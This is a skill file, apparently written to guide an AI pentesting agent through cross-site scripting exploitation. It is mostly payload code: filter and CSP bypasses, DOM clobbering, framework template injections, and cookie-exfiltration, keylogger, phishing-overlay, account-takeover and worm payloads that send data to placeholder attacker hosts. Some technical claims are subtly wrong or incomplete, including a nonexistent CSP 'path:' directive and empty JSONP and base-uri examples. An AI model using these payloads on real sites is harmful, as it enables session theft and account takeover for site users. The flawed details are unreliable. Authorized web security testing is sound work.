---
name: modern-xss
description: "Modern XSS exploitation with polyglot payloads, CSP bypass, DOM clobbering, and framework-specific techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, getDialogEvidence, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
triggers: ["modern xss", "polyglot xss", "csp bypass xss", "dom clobbering", "xss exploitation", "client side attack", "javascript injection", "cross site scripting advanced", "dom xss", "stored xss impact"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1059.007"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP XSS"]
toolChains:
  - name: xss-reflected
    description: "Test for reflected XSS via response-based payloads"
    steps: [httpRequest, parseResponse, evaluateRendered, getDialogEvidence, recordEvidence, writeFinding]
  - name: xss-dom-based
    description: "Test for DOM-based XSS via client-side execution"
    steps: [httpRequest, parseResponse, evaluateRendered, detectReactions, getDialogEvidence, writeFinding]
compositionRules:
  enhances: [web-pentest, business-logic]
---

# Modern XSS Exploitation

## When to Use

- Target accepts user input that is reflected in HTML, JS, attributes, or URLs
- DOM-based sinks identified (`innerHTML`, `eval`, `document.write`, `location.*`)
- CSP headers present but bypassable
- Framework rendering pipelines (React, Angular, Vue, Svelte) with dangerous patterns
- Stored XSS vectors in comments, profiles, messages, settings fields
- Mutation XSS via parser differentials (`<noscript>`, `<template>`)

## Do Not Use

- Target output-encodes all contexts consistently (verified via render test)
- CSP `script-src` with strict nonce-based enforcement and no bypass vectors
- No user-controlled input reaches any sink or reflection point
- Target uses `HttpOnly` cookies exclusively and no sensitive JS-accessible data exists
- Target has no authenticated state worth exfiltrating

## Auth Context

When auth is available (`contextBoosts: [auth]`):
- Authenticated XSS yields session token theft, account takeover, and privilege escalation
- Test both authenticated and unauthenticated reflection points — filters often differ
- Authenticated stored XSS in profile fields affects all users who view the profile
- Authenticated DOM XSS can bypass CSRF protections by extracting tokens from the DOM
- Compare response behavior: some WAFs relax inspection for authenticated sessions

---

## Polyglot Payloads

Payloads designed to fire across multiple injection contexts simultaneously.

### Universal Polyglots

Fires in href, event handler, and JS string contexts.

```javascript
'">><img src=x onerror=alert(1)>
```

Closes HTML tag contexts, breaks out of title/style/textarea/noscript, injects SVG.

```javascript
</title><img src=x onerror=alert(1)>
</textarea><img src=x onerror=alert(1)>
</noscript><img src=x onerror=alert(1)>
```

Generic context-breaker for attribute injection.

```javascript
" onfocus=alert(1) autofocus="
```

Breaks out of any attribute-quoted context.

```javascript
' onmouseover=alert(1) '
```

Inside JS numeric or string arithmetic contexts.

```javascript
';alert(1);//
"-alert(1)-"
```

### Advanced Polyglots

Multi-context payload using URL encoding and parser differential.

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

If injected inside a `<script>` block — breaks script context, triggers via SVG.

```javascript
</script><svg onload=alert(1)>
```

Template injection polyglot for Angular, Vue, Svelte template contexts.

```javascript
{{constructor.constructor('alert(1)')()}}
${alert(1)}
v-html="<img src=x onerror=alert(1)>"
```

---

## Context-Specific Bypass

### HTML Body Context

Injection directly into `<body>` content.

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```


**Filter Bypass:**
- Case variation: `<sVg oNlOaD=alert(1)>`
- Null bytes: `<s%00vg onload=alert(1)>`
- Whitespace variants: `<svg\t onload=alert(1)>`
- Double-encoding: `%253csvg%2520onload%253dalert(1)%253e`

### Attribute Context

Injection inside an HTML attribute value.

```html
" onfocus=alert(1) autofocus="
' onmouseover=alert(1) '
" onclick=alert(1) //
```


**Filter Bypass:**
- Tab/newline between event handler and `=`: `" onfocus	=alert(1)`
- Mixed encoding: `" onfocus=&#97;lert(1)`
- Backtick instead of quotes: `` " onfocus=alert(1) ``

### JavaScript String Context

Injection inside a JS string literal.

```javascript
';alert(1);//
"-alert(1)-"
`-alert(1)-`
\'-alert(1)//
```


**Filter Bypass:**
- Unicode escapes: `\u0027;alert(1);`
- Hex escapes: `\x27;alert(1);`
- Template literal breakout: `` `);alert(1);// ``
- Line continuation: `\` followed by newline to break string

### URL Context

Injection inside `href`, `src`, or `action` attributes.

```html
javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 javascript:alert(1)
```


**Filter Bypass:**
- Tab/newline after `javascript:`: `javascript%0a:alert(1)`
- Mixed case: `jAvAsCrIpT:alert(1)`
- Data URI with whitespace: `data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
- `\t` and `\n` inside protocol: `java\tscript:alert(1)`

### Template Literal Context

Injection inside ES6 template literals.

```javascript
`-alert(1)-`
`${alert(1)}`
`-`${alert(1)}`-`
```


---

## CSP Bypass Techniques

### unsafe-inline Present

If `script-src` includes `unsafe-inline`, standard inline scripts execute. No bypass needed.

### unsafe-eval Present

If `unsafe-eval` is present:

```javascript
eval('alert(1)')
setTimeout('alert(1)')
setInterval('alert(1)')
Function('alert(1)')()
```

### Base URI Injection

If `base-uri` is not restricted:
All relative script `src` paths now resolve to attacker-controlled URLs. Combine with a script file on the attacker domain.

### JSONP Endpoint Abuse

Many CDN-hosted libraries expose JSONP callbacks:
If the domain is allowlisted in CSP, load the JSONP endpoint as a script:

### CDN Script Injection

Check if `script-src` allowlists CDNs with open redirect or content control:
- `cdnjs.cloudflare.com` — extensive library hosting
- `unpkg.com` — npm package hosting
- `jsdelivr.net` — npm/GitHub hosting
- `ajax.googleapis.com` — Google-hosted libraries

If an attacker can publish a package or control a repo, they can inject code into an allowlisted CDN path.

### path: Directive Bypass

If CSP uses `path:` in `script-src`:
Bypass by injecting a script at a path under the allowed directory:
- If upload endpoint stores files under `/app/uploads/`, upload a `.js` file there
- If the app has a route that reflects content as `text/javascript`, use that route

### strict-dynamic Abuse

If `script-src` includes `strict-dynamic`:
Find a DOM XSS or mutation that creates script elements via a trusted script.

### nonce Reuse

If CSP uses nonces but the nonce is leaked or reusable:
- Check if nonce appears in a reflected parameter
- Check if nonce is static across requests (not rotated)
- Reuse the leaked nonce in an injected `<script nonce="LEAKED_NONCE">` tag

### Report-Only Bypass

If CSP is `Content-Security-Policy-Report-Only`, it does not enforce. All bypass techniques apply — the policy only logs violations.

---

## DOM Clobbering

Overwrite DOM properties to influence JavaScript execution.

### Basic Clobbering

```html
<a id=x><a id=x name=y>
```
If JS does `document.owner`, it returns the `<a>` element instead of `document`.

### Prototype Pollution Chain

```html
<input name=x constructor prototype=polluted>
```
Combined with code that reads `config[someKey]`, clobbered elements become truthy values.

### document.domain Override

```html
<a id=domain name=evil.com>
```
If JS reads `document.domain`, it gets the attacker-controlled value.

### Constructor Clobbering

```html
<a id=x name=constructor>
```
Or via named elements:

```html
<form><input name=constructor>
```

### URL Parser Clobbering

```html
<a id=url href="https://evil.com">
```
If JS reads `element.href` or parses `document.getElementById('url').href`, it resolves to the attacker's domain.

---

## Framework-Specific XSS

### React

**dangerouslySetInnerHTML:**
- Direct HTML injection if user input is not sanitized
- Payload: `<img src=x onerror=alert(document.cookie)>`
- Bypass React's JSX escaping — JSX escapes `{userInput}` but not `dangerouslySetInnerHTML`

**React URL handlers:**
- React allows `javascript:` URLs in `href`
- Payload: `javascript:alert(1)`
- React 16.x+ warns but does not block in all cases
- Test both `<a href>` and `<iframe src>` patterns

**React state mutation:**
- If React state is serialized to DOM (e.g., `data-*` attributes), inject payloads into state values that become attributes

### Angular

**Template injection:**

```html
{{7*7}}
{{constructor.constructor('alert(1)')()}}
```

**Angular bypasses:**
- `bypassSecurityTrustHtml()` — disables sanitizer for specific values
- `[innerHTML]` binding with unsanitized input
- `DomSanitizer.bypassSecurityTrustScript()` for script context
- `routerLink` with attacker-controlled navigation targets

**Angular-specific payloads:**

```html
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
{{x = {'y':''.constructor.prototype}; x['y'].concat=[].join;$eval('x=alert(1)');}}
<svg><script>alert&#40;1&#41;</script>
```

### Vue

**v-html directive:**
- Direct HTML injection, equivalent to `innerHTML`
- Payload: `<img src=x onerror=alert(1)>`

**Vue template injection:**

```html
{{constructor.constructor('alert(1)')()}}
v-if="alert(1)"
```

**Vue event handler injection:**
If user input is placed in Vue template directives.

```html
v-on:click=alert(1)
@click=alert(1)
```

### Svelte

**{#html} / {@html} tag:**
- Direct HTML injection
- No built-in sanitization
- Payload: `<img src=x onerror=alert(1)>`

**Svelte reactive statements:**
If user input reaches reactive declarations.

```svelte
<script>
$:eval('alert(1)')
</script>
```

---

## Mutation XSS (mXSS)

Exploits parser differentials between browser sanitizers and actual rendering.

### noscript Escaping

When `noscript` content is parsed by a sanitizer that treats it as raw text, but the browser renders it when JS is enabled.

```html
<noscript><img src=x onerror=alert(1)></noscript>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### textarea/title Injection

Sanitizers may not parse inside raw text elements, but browser mutation can break out.

```html
<textarea><img src=x onerror=alert(1)></textarea>
<title><img src=x onerror=alert(1)></title>
```

### DOMParser mXSS

DOMParser may interpret content differently than the live DOM, enabling bypasses.

```javascript
var p = new DOMParser();
var doc = p.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
```

### Template Element mXSS

Content inside `<template>` is not rendered until the element is cloned and appended to the DOM.

```html
<template><img src=x onerror=alert(1)></template>
```

### SVG ForeignObject

SVG namespace parsing differs from HTML, bypassing some sanitizers.

```html
<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
```

---

## Exfiltration Techniques

### OOB Data Theft

```javascript
fetch('https://YOUR-OAST/?c='+document.cookie)
new Image().src='https://YOUR-OAST/?c='+document.cookie
```

### CSS Exfiltration

Brute-force character-by-character extraction of input values.

**Modern CSS exfiltration:**

```css
input[value^="a"] { background-image: url(https://YOUR-OAST/?c=a); }
input[value^="b"] { background-image: url(https://YOUR-OAST/?c=b); }
```

### WebSocket Exfiltration

```javascript
var ws=new WebSocket('wss://YOUR-OAST/');
ws.onopen=function(){ws.send(document.cookie)};
```

### Fetch API Exfiltration

```javascript
fetch('/api/user-data').then(r=>r.json()).then(d=>{fetch('https://YOUR-OAST/?d='+JSON.stringify(d))})
```

### DNS Exfiltration

Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.

```javascript
new Image().src='https://'+btoa(document.cookie).replace(/=/g,'')+'.YOUR-OAST/'
```

---

## Impact Demonstration

### Session Hijacking

```javascript
new Image().src='https://YOUR-OAST/?s='+document.cookie
```
Stolen session token allows attacker to impersonate the victim.

### Account Takeover

Combine session theft with account modification for permanent takeover.

```javascript
fetch('/api/account/email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})
```

### Phishing Overlay

```javascript
document.body.innerHTML='<form action=https://evil.com><input name=password type=password placeholder=Enter password></form>'
```

### Worm Payload

```javascript
fetch('/api/post',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'<img src=x onerror=eval(atob("bmV3IEltYWdlKCkuc3JjPSdodHRwczovL1lPVVItT0FTVC8nPQ=="))>'})})
```

### Keylogger

```javascript
document.onkeypress=function(e){new Image().src='https://YOUR-OAST/?k='+e.key}
```


---

## Anti-Hallucination

- Every payload MUST be tested via `evaluateRendered` or `getDialogEvidence` before claiming it fires
- Do NOT claim a CSP is bypassable without verifying the `Content-Security-Policy` header via `httpRequest`
- Do NOT claim DOM clobbering works without confirming the target JS reads the clobbered property
- Do NOT claim framework injection works without verifying the framework version and template syntax
- Do NOT assume a sanitizer is bypassable — test with actual payloads and verify via render
- Record every evidence artifact: HTTP responses, rendered DOM snapshots, dialog confirmations
- If a payload does not fire, report the specific failure mode (blocked by CSP, output-encoded, not reflected, etc.)

## Trigger Conditions

Activate when user input is reflected or flows into an HTML/JS/attribute/URL sink, or a DOM sink (`innerHTML`, `eval`, `document.write`, `location.*`, jQuery selectors) consumes untrusted data. Trigger on CSP-bearing pages (when bypasses may exist), framework pipelines (React/Angular/Vue/Svelte) with dangerous bindings, stored vectors (comments/profiles/messages), and parser-differential (mXSS) contexts. Do not trigger when output is consistently context-encoded and verified, CSP is strict nonce-enforced with no bypass, or no input reaches any sink.

## Detection Approach

First determine the injection context from the reflection point: HTML body, attribute, JS string, template literal, URL `href`/`src`, or DOM sink. Pick a context-appropriate probe (e.g., `{{7*7}}`-style math won't apply; use a script/event-handler shape) and confirm execution via `evaluateRendered`/`getDialogEvidence` — reflection alone is not XSS. If a filter blocks, switch context or encoding (case, null byte, unicode, double-encode, protocol whitespace) and use polyglots that span multiple contexts. When CSP is present, inspect it first (`script-src` directives) and only attempt bypasses that are actually available (`unsafe-inline`, JSONP on allowlisted CDN, `strict-dynamic` with a trusted DOM-XSS, nonce reuse, `path:` upload). For DOM XSS, trace the client-side data flow to the sink rather than relying on server reflection. For stored XSS, verify the payload persists and fires for other viewers.

## Pitfalls

- Claiming XSS from reflection alone — the payload must actually execute in the rendered DOM (`evaluateRendered`/`getDialogEvidence`).
- Assuming a CSP is bypassable without reading the actual `Content-Security-Policy` header and available directives.
- Assuming framework escaping is bypassed — JSX escapes `{input}`; only `dangerouslySetInnerHTML`/v-html/bypassSecurityTrust* are sinks.
- Guessing DOM clobbering works without confirming the app reads the clobbered property.
- Treating a WAF block as success — report the blocked attempt honestly.
- Overlooking that `HttpOnly` cookies limit token theft even when XSS fires.

## Verification & Impact

CONFIRMED when a payload demonstrably executes in the rendered DOM (dialog/alert evidence, or script side-effect observed via `getDialogEvidence`/`evaluateRendered`), or stored XSS fires for another viewer. SUSPECTED when reflection occurs but execution isn't proven — record as candidate. Document impact by capability and context: session/cookie theft and account takeover (highest when authenticated), phishing overlay, worm, keylogger, or mere visual defacement. Note CSP status and whether a bypass was required. Capture the request, rendered DOM snapshot, and dialog evidence via `recordEvidence`.
